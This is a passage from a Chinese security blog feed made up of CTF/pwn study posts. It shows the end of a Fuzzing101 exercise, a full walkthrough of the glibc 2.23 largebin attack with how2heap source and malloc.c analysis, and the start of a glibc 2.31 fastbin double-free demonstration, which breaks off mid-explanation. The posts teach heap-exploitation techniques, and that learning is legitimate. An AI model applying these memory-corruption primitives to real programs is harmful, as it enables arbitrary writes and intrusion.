src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645521014969591/59e6faac75b3911da2e3566a83a3f2b1e7a421c5.png" alt="image-20220222171014762"></p><p>可以发现程序调用了很多次<code>Parser::getObj</code>函数，再结合文档叙述发现确实是这样。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645521247526414/2b904e58c3173a8651c7c1d31ccb34d82b4b9519.png" alt="image-20220222171407364"></p><p>CVE-2019-13288：<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">https://www.cvedetails.com/cve/CVE-2019-13288/</a></p><hr><p>参考链接</p><p><a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201</a></p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之largebin_attack</title>
      <link href="/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/"/>
      <url>/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/</url>
      
        <content type="html"><![CDATA[<p> 和 unsorted bin attack 有点类似，都是通过把 fake_chunk 挂进 bin 中来引发问题，与 unsorted bin attack 不同的就是 large bin 要多考虑两个结构<code>fd_nextsize</code>和<code>bk_nextsize</code></p><p><strong>glibc：2.23</strong></p><h2 id="large-bin-结构"><a href="#large-bin-结构" class="headerlink" title="large bin 结构"></a>large bin 结构</h2><p>大于512（1024）字节的 chunk 称之为 large chunk，large bin 就是用于管理这些 large chunk 的</p><ul><li>从大到小排序</li><li>如果大小相同，按照free的时间排序</li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639310788834389/05e879c1f22990e99abbdf85b9eafc648a1a8177.png" alt="image-20211212200628434"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945814748879/4794b21608a2086ab4a7b2cd01c8985f0140d223.png" alt="image-20211208144334575"></p><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>19 行，首先定义了两个变量 stack_var1 和 stack_var2，然后再分别申请了 3 个 chunk ，p1(0x320)、p2(0x400)、p3(0x400)，中间用 0x20 大小的 chunk 隔开</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639382177222005/d31527cb373bbf387c4fb3ce5c3780f84b7afff0.png" alt="image-20211213155616943"></p><p>22 行，free 掉 chunk_p1 和 chunk_p2，因为大小超出了 fastbin 的范围，所以链入 unsorted bin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639383361337294/85edf70f0102fc0d8501d55a440da63d7c838545.png" alt="image-20211213161601180"></p><p>24 行，申请一个 0x90 大小的 chunk </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639383820252624/9d572eff0a6a53d362c1861a31937797741e1d2c.png" alt="image-20211213162340098"></p><p>这一步做了很多事</p><ul><li>从 unsorted bin 中拿出 p1(0x602000) （因为 unsortedbin 遵循先进先出）</li><li>把 p1 放入 small bin，标记 small bin 中有空闲 chunk </li><li>从 unsorted bin 中拿出最后一个 chunk_p2</li><li> 将 p2 放入 large bin(大于0x3f0)，标记 large bin 中有空闲 chunk </li><li> unsorted bin 为空，从 small bin 中的 p1 分割出一个 chunk，把分割剩下的 chunk 丢入 unsorted bin</li></ul><p>26 行，释放 chunk_p3，同理也会进入 unsorted bin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639385500953829/2fb4ed544000717197563f441cd993740b57bbeb.png" alt="image-20211213165140789"></p><p>32 行，修改 chunk_p2 内部结构</p><p>修改前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639386565637496/d8a83be901875cfc66e2158ee6fb6d807a55f996.png" alt="image-20211213170925481"></p><p>修改后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639386437876625/72a8654447b08985105ab2f38f20fb7ea5e23700.png" alt="image-20211213170717719"></p><p>bk 改为了 <code>stack_var1 - 0x10</code>，所以以 <code>stack_var1 - 0x10</code>为 chunk 头的 fd 指针就是<code>stack_var1</code></p><p>同理， <code>bk_nextsize</code>被修改成了 <code>stack_var2 - 0x20 </code>，所以以<code>stack_var2 - 0x20 </code>为 chunk 头的 <code>fd_nextsize</code>就是<code>stack_var2</code> </p><p>用图片表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639461615306750/74a8bd95b113349443df3cddc2409d099bea745e.png" alt="20210120161024708"></p><p>34 行，申请一个 0x90 大小的 chunk ，和之前一样</p><p>申请前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639464055148389/0969ad83f00fcc96371544c4507a7d4f374f9810.png" alt="image-20211214144054971"></p><p>申请后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639573853524011/d3b343245a4fc617196492a6921f16ecbc91645c.png" alt="image-20211215211053336"></p><ul><li>从 unsorted bin 中拿出 p1_left (0x6020a0)，放入 small bin，并标记 small bin 中有空闲 chunk </li><li>再从 unsorted bin 中拿出 p3 (0x6027a0)，放入 large bin，并标记 large bin 中有空闲 chunk</li><li>从 small bin 中分割出一个 0x90 大小的 chunk，剩下的 chunk 丢入 unsorted bin</li></ul><p>37 行，可以发现 stack_var1 和 stack_var2 被改为了同样的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639573179105499/04f877ea97915a4cc4aa1a345d6919b8a4cb7cac.png" alt="image-20211215205938894"></p><h2 id="malloc-c-源码分析"><a href="#malloc-c-源码分析" class="headerlink" title="malloc.c 源码分析"></a>malloc.c 源码分析</h2><p>现在细说 unsorted bin 拿出 p3 的过程，首先会判断 p3 应该归属的 bin 的类型，根据 size 判断出是 large bin，因为此时 large bin 中有 p2，所以还会比较 p3 和 p2 的大小，再根据实际情况制定两个 chunk 的 <code>fd_nextsize</code>、<code>bk_nextsize</code>、<code>fd</code>、<code>bk</code>指针，以下是具体过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 </span></span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"> unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (size == nb)</span><br><span class="line">   &#123;</span><br><span class="line">     set_inuse_bit_at_offset (victim, size);</span><br><span class="line">     <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">       victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     check_malloced_chunk (av, victim, nb);</span><br><span class="line">     <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">     alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = smallbin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">     <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">         size |= PREV_INUSE;</span><br><span class="line">         <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">         assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">         <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">           &#123;</span><br><span class="line">             fwd = bck;</span><br><span class="line">             bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">             victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">             victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">             fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">             <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                 assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">               <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">               fwd = fwd-&gt;fd;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">             bck = fwd-&gt;bk;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> mark_bin (av, victim_index);</span><br><span class="line"> victim-&gt;bk = bck;</span><br><span class="line"> victim-&gt;fd = fwd;</span><br><span class="line"> fwd-&gt;bk = victim;</span><br><span class="line"> bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后会比较 <code>要放入的chunk (p3)</code>和 <code>原来的chunk (p2)</code> 之间的大小</p><h3 id="p3-size-lt-p2-size"><a href="#p3-size-lt-p2-size" class="headerlink" title="p3_size &lt; p2_size"></a>p3_size &lt; p2_size</h3><p>如果 p3_size &lt; p2_size</p><p>就会执行下面的代码，<strong>因为之前我们把 p2 的 size 改为了0x3f0</strong>，p3 的 size 为 0x410，p3_size &gt; p2_size，所以会绕过这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)<span class="comment">//如果 p3 的 size 比 p2 的 size 小 </span></span><br><span class="line">  &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="p3-size-p2-size"><a href="#p3-size-p2-size" class="headerlink" title="p3_size == p2_size"></a>p3_size == p2_size</h3><p>接着会判断 p3_size == p2_size 的情况</p><p>很显然也绕过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">  <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">  fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><h3 id="p3-size-gt-p2-size"><a href="#p3-size-gt-p2-size" class="headerlink" title="p3_size &gt; p2_size"></a>p3_size &gt; p2_size</h3><p>然后就是 p3_size &gt; p2_size 的情况了</p><p>结合之前修改 p2 的内容可以得出</p><ul><li>p2-&gt;bk-&gt;fd = stack_var1</li><li>p2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span><span class="comment">//制定 fd_nextsize 和 bk_nextsize</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;         <span class="comment">//victim 为 p3;fwd 为 p2</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure><p>把上面的代码转化一下就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">P3-&gt;fd_nextsize = P2;  <span class="comment">//P3的fd_nextsize要修改成P2的头指针</span></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; <span class="comment">//P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span></span><br><span class="line">P2-&gt;bk_nextsize = P3;  <span class="comment">//P2的bk_nextsize要修改成P3的头指针</span></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; <span class="comment">//P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span></span><br><span class="line">   &#125;</span><br><span class="line">   bck = P2-&gt;bk; <span class="comment">//bck等于P2的bk</span></span><br></pre></td></tr></table></figure><p>再转换</p><ul><li>p2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2</li><li>p3-&gt;bk_nextsize = p2-&gt;bk_nextsize</li><li>p3-&gt;bk_nextsize-&gt;fd_nextsize = p3</li></ul><p>解方程得 <code>stack_var2 = P3</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);<span class="comment">//制定 fd 和 bk</span></span><br><span class="line">victim-&gt;bk = bck; </span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>同理得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk; <span class="comment">//P3的bk指针要等于P2的bk指针</span></span><br><span class="line">P3-&gt;fd = P2; <span class="comment">//P3的fd指针要等于P2的头指针</span></span><br><span class="line">P2-&gt;bk = P3; <span class="comment">//P2的bk指针要等于P3的头指针</span></span><br><span class="line">P2-&gt;bk-&gt;fd = P3; <span class="comment">//P2的bk指针指向的堆块的fd指针要等于P3的头指针</span></span><br></pre></td></tr></table></figure><p>再转换</p><ul><li>p2-&gt;bk-&gt;fd = stack_var1</li><li>p2-&gt;bk-&gt;fd = p3</li></ul><p>解方程得 <code>stack_var1 = P3</code></p><p>综上  <code>stack_var1 = stack_var2 = P3</code></p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/112825556?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/112825556?spm=1001.2014.3001.5501</a></p><p>  ​        </p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之how2heap-2.31</title>
      <link href="/2021/12/09/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhow2heap-2-31/"/>
      <url>/2021/12/09/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhow2heap-2-31/</url>
      
        <content type="html"><![CDATA[<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>和 2.27 没啥区别，依旧要填满 tcachebin 才能 double free</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g fastbin_dup.c -o fastbin_dup</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">               <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free     list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a)    ;</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p tw    ice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>（之后行数为断点位置）</p><p>20 行，将 tcachebin 填满</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639053203655958/866ce742c70ee90bc8dd8a8382f78ea677262d8d.png" alt="image-20211209203323430"></p><p>29 行，calloc 三个 chunk，地址后三位分别是 3a0、3c0、3e0，由于这里是使用 calloc 创建的，所以不会分配 tcache bin 